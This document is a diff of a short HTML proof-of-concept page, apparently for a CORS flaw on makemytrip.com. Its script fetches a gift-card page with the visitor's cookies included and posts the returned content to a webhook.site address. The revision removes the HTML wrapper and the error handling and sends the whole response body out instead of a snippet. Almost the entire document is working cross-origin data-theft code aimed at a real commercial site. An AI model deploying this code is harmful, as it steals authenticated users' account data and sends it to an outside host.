@@ -1,34 +1,11 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <title>CORS PoC - MMT</title>
-</head>
-<body>
 <script>
-fetch('https://www.makemytrip.com/gift-cards/corporate-gift-vouchers/', {
+  fetch('https://www.makemytrip.com/gift-cards/corporate-gift-vouchers/', {
   method: 'GET',
   credentials: 'include'
 })
-.then(response => response.text())
-.then(body => {
-  // Send partial response to your webhook
-  fetch('https://webhook.site/de27185c-3af2-4bcd-8144-dee66cf296f8', {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({
-      origin: location.origin,
-      htmlSnippet: body.slice(0, 1000)
-    })
-  });
-})
-.catch(error => {
-  fetch('https://webhook.site/de27185c-3af2-4bcd-8144-dee66cf296f8', {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ error: error.toString() })
-  });
-});
+.then(r => r.text())
+.then(body => fetch('https://webhook.site/de27185c-3af2-4bcd-8144-dee66cf296f8', {
+  method: 'POST',
+  body
+}));
 </script>
-</body>
-</html>
